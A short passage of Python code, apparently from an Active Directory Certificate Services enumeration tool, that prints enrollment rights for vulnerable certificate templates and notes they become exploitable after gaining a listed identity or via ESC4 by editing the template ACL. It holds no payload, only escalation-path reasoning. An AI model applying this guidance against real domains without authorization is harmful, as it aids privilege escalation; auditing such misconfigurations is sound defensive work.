                out.kv("    Enrollment rights", ", ".join(t["enrollees"]), indent=6)
        out.info(
            f"Above templates match {esc_id} config but the current identity cannot "
            "enroll — exploitable only after gaining one of the listed identities, "
            "or via ESC4 if you can edit the template ACL."
        )
